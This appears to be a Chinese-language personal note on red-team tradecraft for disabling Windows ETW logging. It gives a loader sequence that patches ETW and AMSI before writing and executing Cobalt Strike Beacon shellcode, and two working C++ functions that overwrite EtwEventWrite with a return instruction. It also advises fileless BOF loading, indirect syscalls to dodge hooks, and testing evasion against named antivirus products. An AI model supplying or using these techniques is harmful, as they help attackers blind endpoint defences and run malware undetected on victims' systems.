# Patch ETW
1. ![[1744337645647.jpg]]
2. 实战中使用bypass etw 如果要落地文件最好采用Nim或者Rust编写的相关文件，优点就是不怕反编译这应该是指单独落地和绕过etw相关的文件不是和loader写在一起。
3. 如果实战中是cs上最好采用bof加载patch etw同时支持内存驻留（方便一直调用，），也就是说是不是可以先通过shellcodeloader上线之后，再通过bof做内存驻留的patch etw，找一下相关项目
4. 实战中最好的方式就是只落地一个loader，其余的都是用无文件，pe文件就使用pr-loader，.NET程序集就是用BOF.NET方式加载 
## 相关疑问解决
1. 由于BOF时通过beacon的进程子线程运行，所以在运行过程中其他通过beacon的任务将无法进行，只能等待BOF加载完成才可以
2. 一旦BOF将该进程的ETW给patch掉，那么该进程后续的所有代码的运行所有行为都不会被etw记录，但是要注意核晶还有一些顶级的EDR会通过内核层的API记录相关事件，这个时无法避免的
3. 如果只是落地loader文件，其他攻击过程均是五文件的内存加载形式执行，那么最好的方式就是loader中先执行bapass ETW AMSI UAC等代码段，然后再加载shellcode，一定要注意流程
loader正确执行顺序如下：
```text
1. loader 执行
2. patch ETW（如 patch EtwEventWrite → ret）
3. patch AMSI（可选，但推荐）
4. 申请内存（VirtualAlloc/NtAllocate）
5. 写入 Beacon shellcode 或 payload
6. 修改权限（RW → RX）
7. 创建线程（或 syscall CreateThread）执行 payload
```

示例代码如下所示
```cpp
void patch_etw() {
    void* etw = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    DWORD old;
    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)etw = 0xC3; // ret
    VirtualProtect(etw, 1, old, &old);
}

void run_loader() {
    patch_etw();        // ⬅️ 必须在最前面！
    patch_amsi();       // （推荐）

    void* mem = VirtualAlloc(...);   // 内存申请
    memcpy(mem, payload, size);      // 复制 shellcode
    VirtualProtect(mem, size, PAGE_EXECUTE_READ, ...);
    CreateThread(..., mem);          // 执行 shellcode
}
```

1. #注意：使用bof的时候，尤其是使用别人项目已经编译好的bof是，要看清功能点，看清需要的参数，以及功能点背后的规避原理，这些都非常重要，至于bof的规避是否还生效就只能自己搭建环境测试了
2. #测试方式：利用processhacker看一下事件记录和报毒情况，最好的测试软件就是360核晶和卡巴斯基（尤其是测试对敏感行为的查杀）

一下为其他项目中的Bypass ETW代码块
```cpp
void BypassETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return;
    DWORD oldProtect;
    if (VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        *(PBYTE)pEtwEventWrite = 0xC3; // RET
        VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
        DEBUG_PRINT("ETW bypassed", 0);
    }
}
```

使用方法：直接调用函数 `BypassETW()`即可，如果在loader中加入patch etw的话最好采用间接syscall的方式去调用，防止被HOOK